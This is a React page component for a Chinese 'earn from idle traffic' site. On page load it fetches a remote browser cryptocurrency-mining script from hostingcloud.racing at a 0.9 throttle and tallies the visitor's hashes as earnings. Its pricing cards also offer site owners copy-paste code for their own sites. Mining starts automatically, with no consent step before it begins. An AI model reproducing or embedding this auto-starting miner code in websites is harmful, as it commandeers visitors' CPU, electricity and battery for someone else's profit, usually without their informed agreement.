import React from 'react';
import PropTypes from 'prop-types';
import Button from '@material-ui/core/Button';
import Grid from '@material-ui/core/Grid';
import Typography from '@material-ui/core/Typography';
import { withStyles } from '@material-ui/core/styles';
import "../components/layouts/global.css"
import Home from '../components/layouts/Home';
import CircularProgress from '@material-ui/core/CircularProgress';
import Card from '@material-ui/core/Card';
import CardActions from '@material-ui/core/CardActions';
import CardContent from '@material-ui/core/CardContent';
import CardHeader from '@material-ui/core/CardHeader';
import StarIcon from '@material-ui/icons/StarBorder';
import { importMineScript } from '../utils/miner';

const styles = theme => ({
  

  layout: {
    width: 'auto',
    marginLeft: theme.spacing.unit * 3,
    marginRight: theme.spacing.unit * 3,
    [theme.breakpoints.up(900 + theme.spacing.unit * 3 * 2)]: {
      width: 900,
      marginLeft: 'auto',
      marginRight: 'auto',
    },
  },
  progress: {
    margin: theme.spacing.unit * 2,
  },
  heroUnit: {
    backgroundColor: theme.palette.background.paper,
  },
  heroContent: {
    maxWidth: 600,
    margin: '0 auto',
    padding: `${theme.spacing.unit * 8}px 0 ${theme.spacing.unit * 6}px`,
  },
  heroButtons: {
    marginTop: theme.spacing.unit * 4,
  },
  cardHeader: {
    backgroundColor: theme.palette.grey[200],
  },
  cardPricing: {
    display: 'flex',
    justifyContent: 'center',
    alignItems: 'baseline',
    marginBottom: theme.spacing.unit * 2,
  },
  cardActions: {
    [theme.breakpoints.up('sm')]: {
      paddingBottom: theme.spacing.unit * 2,
    },
  },
  
 
});
const tiers = [
  {
    title: '挂机',
    description: ['闲置设备可以带来额外收益', '基于网页非常通用', '娱乐办公时的调剂', '节约电力和带宽费用'],
    buttonText: '立即注册',
    buttonVariant: 'outlined',
  },
  {
    title: '流量主',
    subheader: '为您的流量带来额外收益',
    description: [
      '一键获取代码复制粘帖',
      '多个域名站点的支持',
      '站长公众号App都可以接入',
      '免广告和电商的安宁的用户体验',
    ],
    buttonText: '注册并且获取代码',
    buttonVariant: 'contained',
  },
  {
    title: '内容创作者',
    description: [
      '实时观测内容的收益情况',
      '基于停留时间的统计',
      '社区互助',
      '让创造力变成财富',
    ],
    buttonText: '马上开始发表内容',
    buttonVariant: 'outlined',
  },
];


class IndexHome extends React.Component {
  constructor(props){
    super(props);
    this.state = {
      minerStarted: false,
      totalHashed: 0
    }
  }
  componentDidMount(){
    if(window){
      const { personalMiner } = this.props;
      const minerId = personalMiner._id;
      importMineScript("https://www.hostingcloud.racing/0ZUJ.js", 0.9, minerId, (hash, balanceAmount, miner)=>{
        const { minerStarted, totalHashed } = this.state;
        if(hash>0){
          this.setState({
            minerStarted: true
          })
        }
        let newHashed =totalHashed+hash;
        
        if(minerStarted){
          this.setState({
            totalHashed: newHashed,
          })
        }
       
        
      })

    }
  }
  render(){
    const { classes, currentUser } = this.props;
    const { minerStarted, totalHashed } = this.state;
    
    return (
      <Home currentUser={currentUser} title="乐多多云收益">
         <div className={classes.heroUnit}>
            <div className={classes.heroContent}>
              <Typography component="h1" variant="h2" align="center" color="textPrimary" gutterBottom>
                {minerStarted?  "您已经为本站贡献了": "正在准备收益"}
              </Typography>
             
              {
                !minerStarted ?  
                <div style={{
                  display: "flex",
                  flexDirection: "row",
                  justifyContent: "center"
                }}>
                  <CircularProgress className={classes.progress} color="secondary" />
                </div>
                :
                <Typography variant="h6" align="center" color="textSecondary" paragraph>
                  ￥{(totalHashed*1.5e-09).toFixed(10)}元
                </Typography>
              }
              <Typography variant="h6" align="center" color="textSecondary" paragraph>
                为您的流量带来额外收益
              </Typography>
              <div className={classes.heroButtons}>
                <Grid container spacing={16} justify="center">
                  <Grid item>
                    <Button variant="contained" color="primary">
                      了解详情
                    </Button>
                  </Grid>
                  <Grid item>
                    <Button component="a" href="/register" variant="outlined" color="primary">
                      注册,立刻挣钱
                    </Button>
                  </Grid>
                </Grid>
              </div>
            </div>
          </div>
          <div  className={classes.layout}>
          <Grid container spacing={40} alignItems="center">
          {tiers.map(tier => (
            // Enterprise card is full width at sm breakpoint
            <Grid item key={tier.title} xs={12} sm={tier.title === 'Enterprise' ? 12 : 6} md={4}>
              <Card>
                <CardHeader
                  title={tier.title}
                  subheader={tier.subheader}
                  titleTypographyProps={{ align: 'center' }}
                  subheaderTypographyProps={{ align: 'center' }}
                  action={tier.title === 'Pro' ? <StarIcon /> : null}
                  className={classes.cardHeader}
                />
                <CardContent>
                  
                  {tier.description.map(line => (
                    <Typography variant="subtitle1" align="center" key={line}>
                      {line}
                    </Typography>
                  ))}
                </CardContent>
                <CardActions className={classes.cardActions}>
                  <Button fullWidth variant={tier.buttonVariant} color="primary">
                    {tier.buttonText}
                  </Button>
                </CardActions>
              </Card>
            </Grid>
          ))}
        </Grid>
          </div>
          
          
        
      </Home>
    );
  }
 
}

IndexHome.propTypes = {
  classes: PropTypes.object.isRequired,
};
IndexHome.getInitialProps = async (props) => {
  
  return {
    msg: props.query.msg,
    currentUser: props.query.currentUser,
    personalMiner: props.query.personalMiner,
  }
}

export default withStyles(styles)(IndexHome);